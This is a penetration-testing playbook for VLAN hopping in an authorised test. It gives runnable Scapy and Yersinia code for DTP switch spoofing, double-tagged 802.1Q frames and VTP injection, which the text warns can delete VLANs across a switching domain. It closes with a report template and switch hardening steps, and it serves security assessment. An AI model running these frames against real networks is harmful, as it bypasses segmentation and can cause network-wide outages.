---
name: performing-vlan-hopping-attack
description: >
  Simulates VLAN hopping attacks using switch spoofing and double tagging techniques
  in authorized environments to test VLAN segmentation effectiveness and validate
  switch port security configurations against Layer 2 bypass attacks.
domain: cybersecurity
subdomain: network-security
tags: [network-security, vlan-hopping, layer2-attack, switch-security, 802.1q]
version: "1.0"
author: mahipal
license: Apache-2.0
---
# Performing VLAN Hopping Attack

## When to Use

- Testing the effectiveness of VLAN-based network segmentation during authorized penetration tests
- Validating that switch trunk port configurations prevent unauthorized VLAN access
- Assessing whether 802.1Q tagging and native VLAN configurations resist double-tagging attacks
- Demonstrating to network teams why proper switch hardening is critical for isolation between zones
- Verifying that DTP (Dynamic Trunking Protocol) is disabled on all access ports

**Do not use** on production switches without explicit authorization and change management approval, against critical infrastructure VLANs (SCADA, medical devices) without safety controls, or as a denial-of-service vector.

## Prerequisites

- Written authorization specifying in-scope VLANs and switches for testing
- Physical or virtual access to a switch access port on the target network
- Yersinia, Scapy, and frogger VLAN hopping tools installed on Kali Linux
- Understanding of 802.1Q trunking, DTP, and VLAN tagging at the frame level
- Access to switch CLI for verification of configurations (read-only is sufficient)
- Wireshark for capturing and verifying tagged frames

## Workflow

### Step 1: Enumerate VLAN Configuration

```bash
# Identify the current VLAN assignment of the attacker port
ip link show eth0
cat /proc/net/vlan/config 2>/dev/null

# Use CDP/LLDP to discover switch information
sudo tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether proto 0x88cc' 2>/dev/null
# Or use lldpd
lldpcli show neighbors

# If CDP is enabled, capture CDP frames
sudo tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'

# Use Yersinia to discover DTP and VTP information
sudo yersinia -G &
# Or command line:
sudo yersinia dtp -attack 0 -interface eth0
# This listens for DTP frames to learn trunk negotiation status

# Nmap to identify hosts on other VLANs (if routing exists)
nmap -sn 10.10.10.0/24 10.10.20.0/24 10.10.30.0/24
```

### Step 2: Attempt Switch Spoofing (DTP Attack)

```bash
# Use Yersinia to send DTP frames and negotiate a trunk
sudo yersinia dtp -attack 1 -interface eth0

# This sends DTP desirable frames to convert the access port to a trunk
# If successful, the port becomes a trunk carrying all VLANs

# Alternatively, use Scapy to craft DTP frames
python3 << 'PYEOF'
from scapy.all import *
from scapy.contrib.dtp import *

# Send DTP desirable frame to negotiate trunk
dtp_frame = (
    Ether(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr("eth0")) /
    LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
    SNAP(OUI=0x00000c, code=0x2004) /
    DTP(tlvlist=[
        DTPDomain(type=0x0001, domain=""),
        DTPStatus(type=0x0002, status=b"\x03"),  # Desirable
        DTPType(type=0x0003, dtptype=b"\xa5"),    # 802.1Q trunk
        DTPNeighbor(type=0x0004, neighbor=get_if_hwaddr("eth0"))
    ])
)

sendp(dtp_frame, iface="eth0", count=10, inter=1)
print("[*] DTP desirable frames sent. Check if trunk is negotiated.")
PYEOF

# If trunk negotiation succeeds, verify by capturing tagged frames
sudo tcpdump -en -i eth0 'vlan' -c 10

# Create VLAN subinterfaces to access other VLANs
sudo modprobe 8021q
sudo ip link add link eth0 name eth0.10 type vlan id 10
sudo ip addr add 10.10.10.99/24 dev eth0.10
sudo ip link set eth0.10 up

sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip addr add 10.10.20.99/24 dev eth0.20
sudo ip link set eth0.20 up

# Verify access to other VLANs
ping -c 3 10.10.10.1
ping -c 3 10.10.20.1
```

### Step 3: Attempt Double Tagging Attack

```bash
# Double tagging works when:
# 1. Attacker is on the native VLAN of the trunk
# 2. Target VLAN is different from the native VLAN
# 3. The switch strips the outer tag and forwards the inner tag

python3 << 'PYEOF'
from scapy.all import *

# Craft double-tagged frame
# Outer tag: Native VLAN (e.g., VLAN 1)
# Inner tag: Target VLAN (e.g., VLAN 20 - server VLAN)
target_ip = "10.10.20.10"
target_mac = "ff:ff:ff:ff:ff:ff"

double_tagged = (
    Ether(dst=target_mac, src=get_if_hwaddr("eth0")) /
    Dot1Q(vlan=1) /       # Outer tag: native VLAN (will be stripped)
    Dot1Q(vlan=20) /      # Inner tag: target VLAN (will be forwarded)
    IP(dst=target_ip, src="10.10.20.99") /
    ICMP(type=8)           # Echo request
)

# Send the double-tagged frame
sendp(double_tagged, iface="eth0", count=5, inter=1)
print("[*] Double-tagged frames sent targeting VLAN 20")
print("[!] Note: Double tagging is unidirectional - no responses expected")
PYEOF

# Use frogger for automated VLAN hopping
# frogger identifies native VLAN and attempts double tagging
sudo frogger

# Verify with Wireshark capture on the target VLAN (if possible)
# On a monitoring port in VLAN 20:
tshark -i eth1 -Y "vlan.id == 20 and icmp" -c 10
```

### Step 4: Test VTP (VLAN Trunking Protocol) Attacks

```bash
# If VTP is in use, attempt to inject a VTP message with higher revision number
# This can overwrite VLAN database across all switches in the domain

python3 << 'PYEOF'
from scapy.all import *

# Craft VTP summary advertisement with high revision number
# WARNING: This can disrupt the entire VLAN domain if successful
vtp_frame = (
    Ether(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr("eth0")) /
    LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
    SNAP(OUI=0x00000c, code=0x2003) /
    Raw(load=bytes([
        0x02,                    # Version 2
        0x01,                    # Summary advertisement
        0x00,                    # Followers
        0x06,                    # Domain name length
        0x54, 0x45, 0x53, 0x54, # Domain: "TEST"
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0xFF, 0xFF, # High revision number
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, # MD5 digest (zeros for lab)
    ]))
)

# Only send in authorized lab environments
sendp(vtp_frame, iface="eth0", count=1)
print("[*] VTP summary advertisement sent")
PYEOF
```

### Step 5: Verify Switch Configuration Weaknesses

```bash
# On the switch (with read access), check for misconfigurations:

# Check DTP status on access ports (should be nonegotiate)
# show interfaces <interface> switchport
# Expected: Administrative Mode: static access
#           Negotiation of Trunking: Off

# Check native VLAN configuration (should not be VLAN 1)
# show interfaces trunk
# Expected: Native VLAN not matching any user VLAN

# Check VTP mode (should be transparent or off)
# show vtp status
# Expected: VTP Mode: Transparent

# Check unused ports are disabled
# show interfaces status | include disabled

# Verify port security is enabled
# show port-security
```

### Step 6: Document Findings and Remediation

```bash
# Clean up VLAN subinterfaces
sudo ip link del eth0.10 2>/dev/null
sudo ip link del eth0.20 2>/dev/null

# Stop any running attack tools
sudo killall yersinia 2>/dev/null

# Document all test results with timestamps
cat > vlan_hopping_report.txt << 'EOF'
VLAN Hopping Test Results
=========================
Test Date: $(date)
Tester: Security Assessment Team
Authorization: PENTEST-2024-0847

Test 1: DTP Switch Spoofing
  Result: VULNERABLE - Port negotiated trunk in 3 seconds
  Access gained to: VLANs 1, 10, 20, 30, 40

Test 2: Double Tagging
  Result: VULNERABLE - Frames reached VLAN 20 from VLAN 1
  Note: Unidirectional only (no return traffic)

Test 3: VTP Attack
  Result: NOT TESTED - VTP in transparent mode
EOF
```

## Key Concepts

| Term | Definition |
|------|------------|
| **VLAN Hopping** | Layer 2 attack technique that allows an attacker to access traffic on VLANs they are not authorized to reach, bypassing network segmentation |
| **DTP (Dynamic Trunking Protocol)** | Cisco proprietary protocol that automatically negotiates trunk links between switches; vulnerable to spoofing when not disabled on access ports |
| **Double Tagging** | Attack that encapsulates a frame with two 802.1Q tags, exploiting the switch's native VLAN processing to forward the inner-tagged frame to a different VLAN |
| **Native VLAN** | VLAN assigned to untagged frames on a trunk port; misconfigurations where the native VLAN matches a user VLAN enable double-tagging attacks |
| **VTP (VLAN Trunking Protocol)** | Cisco protocol for propagating VLAN database changes across switches; in server mode, a rogue VTP message with higher revision can overwrite the VLAN database |
| **802.1Q** | IEEE standard for VLAN tagging that inserts a 4-byte tag into Ethernet frames to identify VLAN membership across trunk links |

## Tools & Systems

- **Yersinia**: Layer 2 attack framework supporting DTP, VTP, STP, CDP, DHCP, and 802.1Q attacks with both GUI and CLI modes
- **Scapy**: Python packet manipulation library for crafting custom 802.1Q double-tagged frames and DTP negotiation packets
- **frogger**: VLAN hopping tool that automates native VLAN discovery and double-tagging attacks
- **Wireshark**: Packet analyzer for verifying VLAN tag contents and confirming frame delivery to target VLANs
- **tcpdump**: Command-line capture tool for monitoring 802.1Q tagged frames and DTP/VTP protocol traffic

## Common Scenarios

### Scenario: Testing VLAN Segmentation in a PCI-DSS Cardholder Data Environment

**Context**: A retailer needs to verify that their cardholder data environment (CDE) on VLAN 50 is properly isolated from the corporate network (VLAN 10) and guest WiFi (VLAN 30). The network uses Cisco Catalyst switches with 802.1Q trunking. The assessment is authorized to test from a port on VLAN 10.

**Approach**:
1. Connect to an access port on VLAN 10 and listen for DTP frames to determine trunk negotiation status
2. Send DTP desirable frames using Yersinia -- the port successfully negotiates a trunk because DTP was not disabled
3. Create a VLAN 50 subinterface and attempt to reach CDE systems (10.10.50.0/24) -- successful, demonstrating segmentation bypass
4. Attempt double tagging from VLAN 1 (native VLAN) to VLAN 50 -- also successful because native VLAN is VLAN 1
5. Document that VLAN segmentation fails as a PCI-DSS control due to DTP misconfiguration
6. Recommend disabling DTP on all access ports, changing native VLAN to an unused VLAN, and enabling port security

**Pitfalls**:
- DTP spoofing can cause spanning-tree topology changes that disrupt network connectivity
- Double tagging may not work if the native VLAN is not VLAN 1 or if the switch is configured properly
- VTP attacks in a production environment can delete VLANs across the entire switching domain, causing widespread outages
- Forgetting to remove VLAN subinterfaces after testing, leaving unauthorized VLAN access available

## Output Format

```
## VLAN Hopping Assessment Report

**Test ID**: VLAN-HOP-2024-001
**Switch Under Test**: Core-SW1 (Cisco Catalyst 9300)
**Attacker Port**: Gi1/0/24 (VLAN 10)
**Target VLANs**: VLAN 20 (Servers), VLAN 50 (CDE)

### Test Results

| Attack | Target VLAN | Result | Impact |
|--------|-------------|--------|--------|
| DTP Switch Spoofing | All VLANs | VULNERABLE | Full trunk access gained |
| Double Tagging | VLAN 50 | VULNERABLE | Unidirectional access to CDE |
| VTP Injection | N/A | NOT VULNERABLE | VTP transparent mode |

### Root Causes
1. DTP not disabled on access port Gi1/0/24 (Administrative mode: dynamic auto)
2. Native VLAN is VLAN 1 (default) on all trunk links
3. Unused ports not shutdown on the switch

### Remediation
1. Disable DTP on all access ports: `switchport nonegotiate`
2. Set all access ports to static mode: `switchport mode access`
3. Change native VLAN to unused VLAN: `switchport trunk native vlan 999`
4. Shutdown all unused ports: `shutdown`
5. Enable port security on access ports
6. Set VTP to transparent mode on all switches
```
